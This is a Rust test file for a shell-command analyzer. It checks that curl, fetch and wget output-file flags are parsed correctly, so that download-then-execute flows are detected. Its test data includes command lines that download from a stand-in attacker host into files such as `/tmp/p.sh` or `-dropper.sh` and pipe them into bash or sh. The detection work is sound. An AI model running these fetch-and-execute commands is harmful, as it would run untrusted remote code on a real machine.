//! Tests that kill mutants the weekly cargo-mutants sweep found surviving in
//! `command_download_output_targets` in `shell.rs` (run 42585938875,
//! 2026-11-09), plus the mutants of the same function that sat in the shards
//! that run lost.

use super::*;

use std::sync::mpsc;
use std::time::Duration;

/// The files the first command of `line` writes its download into, as the
/// parsed shell tree gives them. The walk over the words runs on a thread of
/// its own: a walk that stops advancing fails the test instead of hanging the
/// run, and one that steps below the first word fails it at once.
fn download_targets(line: &str) -> Vec<String> {
    let owned = line.to_owned();
    let (done_tx, done_rx) = mpsc::channel();
    std::thread::spawn(move || {
        let tree = parse_complete_tree(&owned).expect("the line is complete shell");
        let command = first_command(tree.root_node()).expect("the line runs a command");
        let _ = done_tx.send(command_download_output_targets(command, owned.as_bytes()));
    });
    match done_rx.recv_timeout(Duration::from_secs(5)) {
        Ok(targets) => targets,
        Err(mpsc::RecvTimeoutError::Timeout) => panic!(
            "reading the output files of `{line}` never returned: the walk over its words \
             stopped advancing"
        ),
        Err(mpsc::RecvTimeoutError::Disconnected) => panic!(
            "reading the output files of `{line}` panicked: the walk stepped outside its words"
        ),
    }
}

/// `curl -o FILE`, `fetch -o FILE` and `wget -O FILE` write the download into
/// FILE. Recording that name is what lets a later `bash < FILE` be seen as
/// running the fetched bytes; a wrong or missing name lets the staged payload
/// run unnoticed. The control feeds the interpreter a different file.
///
/// FAILS ON REVERT: replace command_download_output_targets -> Vec<String>
/// with vec![], with vec![String::new()] or with vec!["xyzzy".into()]; delete
/// match arm "curl" | "fetch" or "wget" in the output flag match; replace ==
/// with != in `argument == "--"`; replace + with - or + with * in
/// `effective.get(index + 1)` after a standalone output flag; replace += with
/// -= in `index += 2`.
#[test]
fn curl_fetch_and_wget_output_flags_name_the_file_they_fill() {
    for line in [
        "curl -o /tmp/p.sh https://evil.example/p",
        "fetch -o /tmp/p.sh https://evil.example/p",
        "wget -O /tmp/p.sh https://evil.example/p",
    ] {
        assert_eq!(
            download_targets(line),
            ["/tmp/p.sh"],
            "the output flag names the file the download fills: {line}"
        );
    }
    assert!(
        has_executable_data_flow("curl -o /tmp/p.sh https://evil.example/p; bash < /tmp/p.sh"),
        "the file curl wrote was fed to bash as code and the flow was missed"
    );
    assert!(
        !has_executable_data_flow("curl -o /tmp/p.sh https://evil.example/p; bash < /tmp/q.sh"),
        "bash read a file the download never wrote; that is not the fetched bytes"
    );
}

/// The long spellings `curl --output FILE` and `wget --output-document FILE`
/// name the file exactly as the short flags do. Each downloader has its own
/// long name, and a long option is never a cluster of short flags, so only
/// the long option table catches it.
///
/// FAILS ON REVERT: delete match arm "curl" | "fetch" or "wget" in the long
/// option match; replace || with && between the long option test and the
/// short flag test.
#[test]
fn a_long_output_option_names_the_file_it_fills() {
    for line in [
        "curl --output /tmp/p.sh https://evil.example/p",
        "wget --output-document /tmp/p.sh https://evil.example/p",
    ] {
        assert_eq!(
            download_targets(line),
            ["/tmp/p.sh"],
            "the long output option names the file the download fills: {line}"
        );
    }
    assert!(
        has_executable_data_flow(
            "wget --output-document /tmp/p.sh https://evil.example/p; bash < /tmp/p.sh"
        ),
        "the file wget wrote through --output-document was fed to bash as code"
    );
}

/// `--output=FILE` and `--output-document=FILE` carry the file name in the
/// same word, and the walk moves on by exactly that one word. An empty value
/// (`--output=`) names no file at all, so nothing is recorded for it. The
/// empty case runs first: it is the one that shows a walk that stops moving
/// without also filling memory with copies of a name.
///
/// FAILS ON REVERT: delete ! in `!target.is_empty()`; replace += with -= or
/// += with *= in the `index += 1` after a glued long option.
#[test]
fn a_glued_long_output_option_names_its_value_and_an_empty_value_names_nothing() {
    assert!(
        download_targets("curl --output= https://evil.example/p").is_empty(),
        "an empty --output= value names no file"
    );
    for line in [
        "curl --output=/tmp/p.sh https://evil.example/p",
        "wget --output-document=/tmp/p.sh https://evil.example/p",
    ] {
        assert_eq!(
            download_targets(line),
            ["/tmp/p.sh"],
            "the value glued to the long option is the file the download fills: {line}"
        );
    }
    assert!(
        has_executable_data_flow(
            "curl --output=/tmp/p.sh https://evil.example/p; bash < /tmp/p.sh"
        ),
        "the file named by --output=VALUE was fed to bash as code"
    );
}

/// An output flag after the URL still names the file. Only the exact flag
/// word takes the next word as its value; the URL before it is not a flag and
/// must not swallow `-o` as a file name.
///
/// FAILS ON REVERT: replace == with != in `argument == format!("-{output_flag}")`.
#[test]
fn an_output_flag_after_the_url_names_the_file_it_fills() {
    for line in [
        "curl https://evil.example/p -o /tmp/p.sh",
        "wget https://evil.example/p -O /tmp/p.sh",
    ] {
        assert_eq!(
            download_targets(line),
            ["/tmp/p.sh"],
            "the output flag after the URL names the file: {line}"
        );
    }
}

/// Every word that is not an output flag is stepped past exactly once, so the
/// walk reaches the flag at the end of a run of other options. A walk that
/// stays on a word never ends, and one that steps back below the first word
/// leaves the command.
///
/// FAILS ON REVERT: replace += with -= or += with *= in the final `index += 1`
/// of the loop.
#[test]
fn the_walk_steps_past_every_other_word_to_reach_the_output_flag() {
    assert!(
        download_targets("curl -s -L https://evil.example/p").is_empty(),
        "a download with no output flag writes no named file"
    );
    assert_eq!(
        download_targets("curl -s -L https://evil.example/p -o /tmp/p.sh"),
        ["/tmp/p.sh"],
        "the output flag after other options and the URL names the file"
    );
}

/// `curl -so FILE` and `wget -qO FILE` end a cluster of short flags with the
/// output flag, so the next word is the file. This is the usual way a fetch
/// is written by hand, and the file it names must be recorded exactly: not
/// the cluster, not the command name, not an empty name.
///
/// FAILS ON REVERT: delete ! in `!flags.starts_with('-')`; replace + with -
/// or + with * in `position + output_flag.len_utf8()`; delete ! in
/// `!inline.is_empty()`; replace + with - or + with * in
/// `effective.get(index + 1)` inside the cluster branch; replace += with -=
/// in the `index += 1` after that next word is taken.
#[test]
fn a_cluster_of_short_flags_ending_in_the_output_flag_takes_the_next_word() {
    for line in [
        "curl -so /tmp/p.sh https://evil.example/p",
        "wget -qO /tmp/p.sh https://evil.example/p",
    ] {
        assert_eq!(
            download_targets(line),
            ["/tmp/p.sh"],
            "the word after the cluster is the file the download fills: {line}"
        );
    }
    assert!(
        has_executable_data_flow("curl -so /tmp/p.sh https://evil.example/p; bash < /tmp/p.sh"),
        "the file `curl -so` wrote was fed to bash as code"
    );
    assert!(
        !has_executable_data_flow("curl -so /tmp/p.sh https://evil.example/p; bash < /tmp/q.sh"),
        "bash read a file the download never wrote"
    );
}

/// `curl -o/tmp/p.sh` and `curl -sLo/tmp/p.sh` glue the file name to the
/// output flag: the name is everything after the flag letter, and the URL
/// that follows is not a file name.
///
/// FAILS ON REVERT: replace + with - or + with * in
/// `position + output_flag.len_utf8()`; delete ! in `!inline.is_empty()`.
#[test]
fn a_file_name_glued_to_the_output_flag_is_the_rest_of_the_cluster() {
    for line in [
        "curl -o/tmp/p.sh https://evil.example/p",
        "curl -sLo/tmp/p.sh https://evil.example/p",
    ] {
        assert_eq!(
            download_targets(line),
            ["/tmp/p.sh"],
            "the text after the flag letter is the file name: {line}"
        );
    }
    assert!(
        has_executable_data_flow("curl -sLo/tmp/p.sh https://evil.example/p; sh < /tmp/p.sh"),
        "the file named inside the cluster was fed to sh as code"
    );
}

/// The word after an output flag is the file name even when it starts with a
/// dash, as `-dropper.sh` does. The walk moves past it as a value and never
/// reads it again as options of its own, which would invent a second file
/// (`pper.sh`, the text after the `o` in `dropper`).
///
/// FAILS ON REVERT: replace += with *= in `index += 2`; replace += with *= in
/// the `index += 1` after the cluster takes the next word.
#[test]
fn the_word_after_an_output_flag_is_the_file_name_even_when_it_starts_with_a_dash() {
    for line in [
        "curl -o -dropper.sh https://evil.example/p",
        "curl -sLo -dropper.sh https://evil.example/p",
    ] {
        assert_eq!(
            download_targets(line),
            ["-dropper.sh"],
            "the dashed word is only the file name, not more options: {line}"
        );
    }
}

/// Two output flags in a row each name their own file. Stepping past the
/// first flag and its file lands exactly on the second flag; landing one word
/// further skips it, and the second file (the one fed to bash here) is never
/// recorded.
///
/// FAILS ON REVERT: replace += with *= in `index += 2`.
#[test]
fn two_output_flags_in_a_row_each_name_their_own_file() {
    let line = "curl -f -L -o /tmp/a.sh -o /tmp/b.sh https://evil.example/a https://evil.example/b";
    assert_eq!(
        download_targets(line),
        ["/tmp/a.sh", "/tmp/b.sh"],
        "both output flags name a file: {line}"
    );
    assert!(
        has_executable_data_flow(&format!("{line}; bash < /tmp/b.sh")),
        "the second file curl wrote was fed to bash as code"
    );
}
